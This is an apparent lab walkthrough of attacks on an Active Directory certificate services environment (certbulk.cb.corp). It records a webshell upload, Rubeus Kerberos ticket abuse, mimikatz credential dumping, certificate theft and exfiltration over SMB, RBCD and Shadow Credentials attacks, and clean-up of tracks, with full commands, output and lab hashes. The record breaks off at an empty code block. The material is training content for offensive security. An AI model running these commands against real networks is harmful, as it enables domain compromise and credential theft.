## `certbulk.cb.corp` ##

- We have a valid domain user in `certbulk.cb.corp`. Search if this user has access to any more computers on the domain.
```powershell
PS C:\ADCS\Auditor> ipmo .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ADCS\Auditor> Find-PSRemotingLocalAdminAccess -Domain certbulk.cb.corp
cb-ws33
```

- Let's also see if we can access any interesting shares.
```powershell
PS C:\ADCS\Auditor> .\SharpShares.exe /domain:certbulk.cb.corp /ldap:all /filter:sysvol,netlogon,ipc$,print$
[+] Parsed Arguments:
        filter: none
        filter: SYSVOL,NETLOGON,IPC$,PRINT$
        dc:
        domain: certbulk.cb.corp
        ldap: all
        ou:
        stealth: False
        threads: 25
        verbose: False
        outfile: none
[*] Excluding SYSVOL,NETLOGON,IPC$,PRINT$ shares
[*] Starting share enumeration with thread limit of 25
[r] = Readable Share
[w] = Writeable Share
[-] = Unauthorized Share (requires /verbose flag)
[?] = Unchecked Share (requires /stealth flag)

[+] Performing LDAP query against Global Catalog for all enabled computers with "primary" group "Domain Computers"...
[+] This may take some time depending on the size of the environment
[+] LDAP Search Results: 25
Status: (0.00%) 0 computers finished (+0) -- Using 21 MB RAM
[+] Starting share enumeration against 25 hosts

[r] \\CB-CA.CB.CORP\CertEnroll
[w] \\CB-CA.CB.CORP\CertEnroll
[+] Finished Enumerating Shares
```

-> No interesting results came up, so we have to find a different attack vector.
### **CB-WEBAPP1** ###
#### Exploitation ####
- **CB-WEBAPP1** hints us toward the fact that web applications could be running on the server. Since we have low privileges at the moments, we could try that path.
![[webapp1.png]]
![[webapp2.png]]

- We are provided with some very insightful information:
- `protecteduse` has uploaded a certificate. This one must be somewhere in the file system of the server. If we can extract it we could possibly impersonate that user.
- A HashiCorp Vault is set up in **CB-VAULT**. These vaults' purpose is to protect secrets, tokens, passwords and other valuable information. This server could be a high-value target.
- We see an upload form. We should test it for file upload vulnerabilities. Let's try to upload an `.aspx` webshell.
![[webshell_upload 1.png]]

- We can use the `/Files/cmd.aspx` path in URL to access our webshell and run commands.
- We notice that we when we execute commands we have **Virtual Account** privileges. However, when we execute domain commands, we get valid results back.
![[local_command.png]]\

- This means that when we run commands that require AD authentication the machine account (`certbulk\cb-webapp1$`) is used.
- We can now try `CertPotato` and `Rubeus` to try and capture a TGT for `certbulk\cb-webapp1$`.
- Before we upload `Rubeus` we will have to find the exact folder in the file system where files from the web app are uploaded.
![[upload_dir.png]]
![[upload_rubeus 1.png]]
![[tgtdeleg.png]]

- We have captured the TGT of `certbulk\webapp1$`. We can now execute a Pass-the-Ticket attack to impersonate that account.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe ptt /ticket:doIF0DCCBcyg...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2


[*] Action: Import Ticket
[+] Ticket successfully imported!

PS C:\ADCS\Auditor> klist

Current LogonId is 0:0x27d5666

Cached Tickets: (1)

#0>     Client: CB-WEBAPP1$ @ CERTBULK.CB.CORP
        Server: krbtgt/CERTBULK.CB.CORP @ CERTBULK.CB.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 9/15/2023 0:45:49 (local)
        End Time:   9/15/2023 10:45:49 (local)
        Renew Time: 9/22/2023 0:45:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- We can not perform any post-exploitation actions since machine accounts can not remotely access to themselves.
- We will execute a S4U2Self attack to impersonate any user we want and request a TGS for a service of our choice.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:http/cb-webapp1.certbulk.cb.corp /ticket:doIF0DCCB...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'CB-WEBAPP1$@CERTBULK.CB.CORP'
[*] Using domain controller: cb-dc.certbulk.cb.corp (172.16.67.1)
[*] Sending S4U2self request to 172.16.67.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'http/cb-webapp1.certbulk.cb.corp'
[*] Got a TGS for 'Administrator' to 'http@CERTBULK.CB.CORP'
[*] base64(ticket.kirbi):

      doIGLzCCBiugAw...
```

- Pass the generated TGS and request a remote session to **CB-WEBAPP1** via winrs.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe ptt /ticket:doIGLzCCBiugA...

<snip>

PS C:\ADCS\Auditor> winrs -r:cb-webapp1.certbulk.cb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator.CERTBULK>
```

#### Post Exploitation ####
- We will now temporarily disable Defender, transfer our tools and perform credentials/tickets harvesting.
```powershell
PS C:\Windows\Tasks> net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed with one or more errors.

PS C:\Windows\Tasks> net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
CERTBULK\Domain Admins
CERTBULK\studentadmin
The command completed successfully.
```

-> **Credential Harvesting**
```
PS C:\Windows\Tasks> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

596     {0;000003e7} 1 D 16030          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;003be073} 0 D 4313416     CERTBULK\Administrator  S-1-5-21-3604858216-2548435023-1717832235-500   (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4332118     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::logonpasswords

<snip>

mimikatz # sekurlsa::ekeys

<snip>

mimikatz # vault::cred /patch

<snip>

sekurlsa::tickets

<snip>
```

- So far, nothing of interest came back. It is time to start enumerating for certificates. We will try all the THEFT TTPs.

-> [[THEFT4]] 
```powershell
PS C:\Windows\Tasks> Get-ChildItem -Recurse -Path C:\ -Include *.pfx, *.pem, *.p12, *.crt, *.cer, *.p7b -ErrorAction SilentlyContinue -Force
Get-ChildItem -Recurse -Path C:\ -Include *.pfx, *.pem, *.p12, *.crt, *.cer, *.p7b -ErrorAction SilentlyContinue -Force


    Directory: C:\certbulkadmindata\certbulkadmindata\Files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/6/2023   2:44 PM           1155 demo.pfx
-a----         4/18/2023  10:26 AM           3299 protecteduser.pfx

<snip>

PS C:\Windows\Tasks> cp C:\certbulkadmindata\certbulkadmindata\Files\protecteduser.pfx .
cp C:\certbulkadmindata\certbulkadmindata\Files\protecteduser.pfx .
```

-> [[THEFT1]]
```powershell
PS C:\Windows\Tasks> certutil -enumstore
certutil -enumstore

  (CurrentUser: -user)
LocalMachine
  (CurrentService: -service)
  (Services: -service -service)
  (Users: -user -user)
  (CurrentUserGroupPolicy: -user -grouppolicy)
  (LocalMachineGroupPolicy: -grouppolicy)
  (LocalMachineEnterprise: -enterprise)

  My                 "Personal"
  Root               "Trusted Root Certification Authorities"
  Trust              "Enterprise Trust"
  CA                 "Intermediate Certification Authorities"
  TrustedPublisher   "Trusted Publishers"
  Disallowed         "Untrusted Certificates"
  AuthRoot           "Third-Party Root Certification Authorities"
  TrustedPeople      "Trusted People"
  ClientAuthIssuer   "Client Authentication Issuers"
  FlightRoot         "Preview Build Roots"
  TestSignRoot       "Test Roots"
  Remote Desktop     "Remote Desktop"
  REQUEST            "Certificate Enrollment Requests"
  SmartCardRoot      "Smart Card Trusted Roots"
  TrustedAppRoot     "Trusted Packaged App Installation Authorities"
  TrustedDevices     "Trusted Devices"
  WebHosting         "Web Hosting"
  WindowsServerUpdateServices
CertUtil: -enumstore command completed successfully.

PS C:\Windows\Tasks> certutil -store -user My
certutil -store -user My
My "Personal"
CertUtil: -store command completed successfully.

PS C:\Windows\Tasks> certutil -store My
certutil -store My
My "Personal"
================ Certificate 0 ================
Serial Number: 3000000009ab1d2a9f13756439000000000009
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 4/18/2023 10:37 AM
 NotAfter: 4/17/2024 10:37 AM
Subject: CN=studentadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
Certificate Template Name (Certificate Type): User
Non-root Certificate
Template: User
Cert Hash(sha1): 93b4027a4cd6a67a175e796e5df8b673acd2d75d
  Key Container = {92F8EF30-299C-4BA5-8621-02D523133332}
  Unique container name: ed7fba667e729565d26ff3e2b2570437_9562c1d6-9af4-4f98-991b-0d206b440803
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed
CertUtil: -store command completed successfully.

PS C:\Windows\Tasks> certutil -exportpfx -p certpass 3000000009ab1d2a9f13756439000000000009 C:\Windows\Tasks\studentadmin.pfx
certutil -exportpfx -p certpass 3000000009ab1d2a9f13756439000000000009 C:\Windows\Tasks\studentadmin.pfx
MY "Personal"
================ Certificate 0 ================
Serial Number: 3000000009ab1d2a9f13756439000000000009
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 4/18/2023 10:37 AM
 NotAfter: 4/17/2024 10:37 AM
Subject: CN=studentadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
Certificate Template Name (Certificate Type): User
Non-root Certificate
Template: User
Cert Hash(sha1): 93b4027a4cd6a67a175e796e5df8b673acd2d75d
  Key Container = {92F8EF30-299C-4BA5-8621-02D523133332}
  Unique container name: ed7fba667e729565d26ff3e2b2570437_9562c1d6-9af4-4f98-991b-0d206b440803
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed
CertUtil: -exportPFX command completed successfully.
```

- Let's now exfiltrate all the looted certificates by temporarily making `certbulk\student33` a local administrator. Then we will use _CIFS_ to copy the files to our machine.
```
PS C:\ADCS\Auditor\Loot> dir \\cb-webapp1.certbulk.cb.corp\c$\windows\Tasks


    Directory: \\cb-webapp1.certbulk.cb.corp\c$\windows\Tasks


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/15/2023   2:30 AM         281088 CertifyKit.exe
-a----         9/15/2023   2:56 AM           1074 enterprise.pfx
-a----         9/15/2023   2:31 AM        1355264 mimikatz.exe
-a----         4/18/2023  10:26 AM           3299 protecteduser.pfx
-a----         9/15/2023   2:58 AM           4273 studentadmin.pfx

PS C:\ADCS\Auditor\Loot> cp \\cb-webapp1.certbulk.cb.corp\c$\windows\Tasks\protecteduser.pfx
PS C:\ADCS\Auditor\Loot> cp \\cb-webapp1.certbulk.cb.corp\c$\windows\Tasks\studentadmin.pfx .
PS C:\ADCS\Auditor\Loot> dir


    Directory: C:\ADCS\Auditor\Loot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/18/2023  10:26 AM           3299 protecteduser.pfx
-a----         9/15/2023   2:58 AM           4273 studentadmin.pfx
```

-> We have harvested 2 new certificates! We can now use them to execute a Pass-the-Certificate attack and impersonate the domain users these certificates were issued for. Let's investigate them.
```powershell
PS C:\ADCS\Auditor> certutil -dump .\Loot\protecteduser.pfx
Enter PFX password:
================ Certificate 0 ================
================ Begin Nesting Level 1 ================
Element 0:
Serial Number: 620000000553a80c566c4b1c8d000000000005
Issuer: CN=CBP-CA, DC=protectedcb, DC=corp
 NotBefore: 4/18/2023 10:13 AM
 NotAfter: 4/17/2024 10:13 AM
Subject: CN=protecteduser, CN=Users, DC=protectedcb, DC=corp
Certificate Template Name (Certificate Type): User
Non-root Certificate
Template: User
Cert Hash(sha1): 8f498987ffa3b7d5e91a6142b34b2a1d1e158db3
----------------  End Nesting Level 1  ----------------
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed
CertUtil: -dump command completed successfully.

PS C:\ADCS\Auditor> certutil -dump .\Loot\studentadmin.pfx
Enter PFX password:
================ Certificate 0 ================
================ Begin Nesting Level 1 ================
Element 0:
Serial Number: 3000000009ab1d2a9f13756439000000000009
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 4/18/2023 10:37 AM
 NotAfter: 4/17/2024 10:37 AM
Subject: CN=studentadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
Certificate Template Name (Certificate Type): User
Non-root Certificate
Template: User
Cert Hash(sha1): 93b4027a4cd6a67a175e796e5df8b673acd2d75d
----------------  End Nesting Level 1  ----------------
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed

================ Certificate 1 ================
================ Begin Nesting Level 1 ================
Element 1:
Serial Number: 51f5aa83c01b57b34635410a3738e79d
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 1/11/2023 5:46 AM
 NotAfter: 1/11/2028 5:56 AM
Subject: CN=CB-CA, DC=cb, DC=corp
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 75e734ee4bb472bd99ff2e308de9b95eeaf80c3f
----------------  End Nesting Level 1  ----------------
No key provider information
Cannot find the certificate and private key for decryption.
CertUtil: -dump command completed successfully.
```
-> The above output is quite insightful. `protectedcb\protecteduser` belongs to a completely different domain that we had no knowledge of! This domain has it's own CA, **CBP-CA**.
-> On the other hand, `certbulk\studentadmin` is a valid user in the current domain. The certificate nesting above indicates that we do not have a CA in the current domain. Instead, we use the CA of the root domain **CB-CA**.

### Enumerating access rights of `certbulk\studentadmin` ###
- Now we have a valid certificate for `certbulk\studentadmin`. Let's try to use it to execute a Pas-the-Certificate attack to impersonate that user.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:studentadmin /certificate:C:\ADCS\Auditor\Loot\studentadmin.pfx /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /password:certpass /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'certbulk.cb.corp\studentadmin'
[*] Using domain controller: 172.16.67.1:88

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 4CDDA14949588AC5E6C1B8132E71D125
```

- We should check if this user has access to any more domain computers.
```powershell
PS C:\ADCS\Auditor> Find-PSRemotingLocalAdminAccess -Domain certbulk.cb.corp
cb-webapp1
cb-ws33
```

- We now have access with local administrator privileges in **CB-WEBAPP1**.
- Of course, we managed to get administrative privileges when we compromised the web server earlier. However this time, the certificate of a user that is a local administrator grants us long-term persistence even if that account changes it's password.
- We can remotely access the server and request a certificate for the _computer account_ as well.
[[1. Theory/2. ADCS Abuses/2. PERSIST/PERSIST2]]
```powershell
PS C:\Windows\Tasks> .\CertifyKit.exe request /machine /template:Machine /ca:cb-ca.cb.corp\cb-ca
.\CertifyKit.exe request /machine /template:Machine /ca:cb-ca.cb.corp\cb-ca
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=cb-webapp1.certbulk.cb.corp

[*] Certificate Authority   : cb-ca.cb.corp\cb-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 61

<snip>
```

- Since we now have compromised a domain computer, we should enumerate the permissions of `certbulk\cb-webapp1$` as well. The most convenient way to do this is through BloodHound.
![[cb-webapp1_genericwrite.png]]
- This permission opens up a new attack vector that allows us to compromise **CB-STORE**.

### CB-STORE ###
#### Exploitation ####
- We have 2 ways to abuse the `GenericWrite` permissions.
	- Perform a RBCD attack.
	- Perform a Shadow Credentials attack.
- Since we have to use the `certbulk\cb-webapp1$` machine account to abuse this permission, we can either:
	- RDP to the machine and use Mimikatz to impersonate `nt authority\system` to `CB-WEBAPP1`.
	- Impersonate `certbulk\cb-webapp1$` through a TGT or certificate.
- In the RBCD attack we have to modify the target machine account's `msds-allowedtoactonbehalfofotheridentity` attribute. For that we can either:
	- Add a new computer ourselves (not OPSEC-wise).
	- Use `CB-WEBAPP1` which we have already compromised.

##### RBCD Attack #####
- We need to impersonate the `certbulk\cb-webapp1$` account. Since we requested a machine certificate earlier, we can easily use it to impersonate this account.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:cb-webapp1$ /certificate:C:\ADCS\Auditor\Loot\cb-webapp1.pfx /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=cb-webapp1.certbulk.cb.corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'certbulk.cb.corp\cb-webapp1$'
[*] Using domain controller: 172.16.67.1:88

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : EF562B1BB2BF4498175D809A76388B80
```

- We can now use the permissions of the impersonated account to alter the `msds-allowedtoactonbehalfofotheridentity` attribute of the target account `cb-store$` to point to the account of our compromised computer account, `cb-webapp1$`.
- That way, we will create the conditions to execute an RBCD attack to compromise **CB-STORE**.
```powershell
PS C:\ADCS\Auditor> $ComputerSid = Get-DomainComputer cb-webapp1 -Properties objectsid | Select -Expand objectsid
PS C:\ADCS\Auditor> echo $ComputerSid
S-1-5-21-3604858216-2548435023-1717832235-1107
PS C:\ADCS\Auditor> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS C:\ADCS\Auditor> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\ADCS\Auditor> $SD.GetBinaryForm($SDBytes, 0)
PS C:\ADCS\Auditor> Get-DomainComputer cb-store.certbulk.cb.corp | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://CB-DC.CERTBULK.CB.CORP/DC=CERTBULK,DC=CB,DC=CORP
VERBOSE: [Get-DomainObject] Extracted domain 'certbulk.cb.corp' from 'CN=CB-STORE,CN=Computers,DC=certbulk,DC=cb,DC=corp'
VERBOSE: [Get-DomainSearcher] search base: LDAP://CB-DC.CERTBULK.CB.CORP/DC=certbulk,DC=cb,DC=corp
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=CB-STORE,CN=Computers,DC=certbulk,DC=cb,DC=corp)))
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0
255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 104 197 221 214 79 8 230 151 43 10 100 102 83 4 0 0' for object 'CB-STORE$'
```

- We are now ready to execute our attack. We will request a TGS for the service name we want to pretend to have administrative privileges for, as well as the user that we want to impersonate.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe s4u /user:cb-webapp1$ /rc4:EF562B1BB2BF4498175D809A76388B80 /impersonateuser:Administrator /msdsspn:http/cb-store.certbulk.cb.corp /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Using rc4_hmac hash: EF562B1BB2BF4498175D809A76388B80
[*] Building AS-REQ (w/ preauth) for: 'certbulk.cb.corp\cb-webapp1$'
[*] Using domain controller: 172.16.67.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<snip>

[*] Action: S4U

[*] Building S4U2self request for: 'cb-webapp1$@CERTBULK.CB.CORP'
[*] Using domain controller: cb-dc.certbulk.cb.corp (172.16.67.1)
[*] Sending S4U2self request to 172.16.67.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'cb-webapp1$@CERTBULK.CB.CORP'
[*] base64(ticket.kirbi):

<snip>

[*] Impersonating user 'Administrator' to target SPN 'http/cb-store.certbulk.cb.corp'
[*] Building S4U2proxy request for service: 'http/cb-store.certbulk.cb.corp'
[*] Using domain controller: cb-dc.certbulk.cb.corp (172.16.67.1)
[*] Sending S4U2proxy request to domain controller 172.16.67.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/cb-store.certbulk.cb.corp':

<snip>
```

##### Shadow Credentials Attack #####
- This attack is way more stealthy and also easier to execute.
- We will use the `certbulk\cb-webapp1$` `GenericWrite` permissions over `certbulk\cb-store$` to modify the target account's `msDS-KeyCredentialLink` attribute and append it with alternate credentials in the form of certificates.

- First we will list the target account's `msDS-KeyCredentialLink` attribute.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe list /target:cb-store$ /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp
[*] Searching for the target account
[*] Target user found: CN=CB-STORE,CN=Computers,DC=certbulk,DC=cb,DC=corp
[*] Listing deviced for cb-store$:
[*] No entries!
```

- We will now edit the `msDS-KeyCredentialLink` attribute.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe add /target:cb-store$ /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password 7svQsFcL95FVBR5e
[*] Searching for the target account
[*] Target user found: CN=CB-STORE,CN=Computers,DC=certbulk,DC=cb,DC=corp
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 5c8956f3-7958-41ee-8963-b2dd3c831b4a
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:cb-store$ /certificate:MIIJwAIBAzCCCXwGCS... /password:"7svQsFcL95FVBR5e" /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /getcredentials /show
```

- Before using the generated certificate, let's verify that the `msDS-KeyCredentialLink` attribute of the target machine account has indeed been modified.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe list /target:cb-store$ /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp
[*] Searching for the target account
[*] Target user found: CN=CB-STORE,CN=Computers,DC=certbulk,DC=cb,DC=corp
[*] Listing deviced for cb-store$:
    DeviceID: 5c8956f3-7958-41ee-8963-b2dd3c831b4a | Creation Time: 9/18/2023 2:19:45 AM
```

- Let's now proceed with the actual exploitation. We will use the generated certificate to request a TGT as `certbulk\cb-store$`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:cb-store$ /certificate:MIIJwAIBAzCCCX... /password:"7svQsFcL95FVBR5e" /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /getcredentials /show

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 6C5AEA06B9068A4DA6E9EFD360D14017
```

- We will use the generated TGT to perform a _S4U2Self_ abuse to request a TGS on behalf of a user with administrative privileges on the target.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:http/cb-store.certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /ptt /ticket:doIGdDCC...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'cb-store$@CERTBULK.CB.CORP'
[*] Using domain controller: cb-dc.certbulk.cb.corp (172.16.67.1)
[*] Sending S4U2self request to 172.16.67.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'http/cb-store.certbulk.cb.corp'
[*] Got a TGS for 'Administrator' to 'http@CERTBULK.CB.CORP'
[*] base64(ticket.kirbi):

<snip>
```

- Now we can clear the edited attribute to cover our tracks and be stealthier. Of course, in order to do so we will nedd to impersonate `certbulk\cb-webapp1$` again, since this account has the `GenericWrite` permissions over `certbulk\cb-store$`.
```powershell
PS C:\ADCS\Auditor> .\Whisker.exe remove /target:cb-store$ /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /deviceid:5c8956f3-7958-41ee-8963-b2dd3c831b4a
[*] Searching for the target account
[*] Target user found: CN=CB-STORE,CN=Computers,DC=certbulk,DC=cb,DC=corp
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Found value to remove
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```

#### Post-Compromisation ####
- We can now access the server.
```powershell
PS C:\ADCS\Auditor> winrs -r:cb-store.certbulk.cb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator.CERTBULK>
```

- We will now search the compromised server to pillage credentials/tokens:
-> **Credential Harvesting**
```powershell
PS C:\Windows\Tasks> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

<snip>

mimikatz # sekurlsa::logonpasswords

<snip>

mimikatz # sekurlsa::ekeys

<snip>

mimikatz # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{9CF8C11D-E8AA-4D0D-A47B-EE1A69244B42} / <NULL>
UserName   : CB\certstore
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : W@rehouse0fdeadCertificates!
Attributes : 0
```

-> Watch that `cb\certsotre` is a domain user that belong to the PARENT domain!

-> [[THEFT1]]
```powershell
PS C:\Windows\Tasks> .\CertifyKit.exe list
.\CertifyKit.exe list
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates



CertifyKit completed in 00:00:00.0306167
```

-> [[THEFT4]]
```powershell
PS C:\Windows\Tasks> Get-ChildItem -Recurse -Path C:\ -Include *.pfx, *.pem, *.p12, *.crt, *.cer, *.p7b -ErrorAction SilentlyContinue -Force
Get-ChildItem -Recurse -Path C:\ -Include *.pfx, *.pem, *.p12, *.crt, *.cer, *.p7b -ErrorAction SilentlyContinue -Force


    Directory: C:\Documents and Settings\certstore\OpenVPN\config


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/5/2023  12:21 AM           1610 protected-vpn-cert.pem
-a----          4/5/2023  12:22 AM           1730 protected-vpn-key.pem

<snip>
PS C:\Users\certstore\OpenVPN\config> dir
dir


    Directory: C:\Users\certstore\OpenVPN\config


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/5/2023  12:21 AM           1610 protected-vpn-cert.pem
-a----          4/5/2023  12:22 AM           1730 protected-vpn-key.pem
-a----          4/5/2023  12:21 AM           2758 PROTECTEDCB_VPN_CONFIG.ovpn
```

- Let's now exfiltrate all the looted certificates by temporarily making `certbulk\student33` a local administrator. Then we will use _CIFS_ to copy the files to our machine.
- We will also request certificates for both `certbulk\certstore` and `certbulk\cb-store$`
-> [[1. Theory/2. ADCS Abuses/2. PERSIST/PERSIST2]]
```powershell
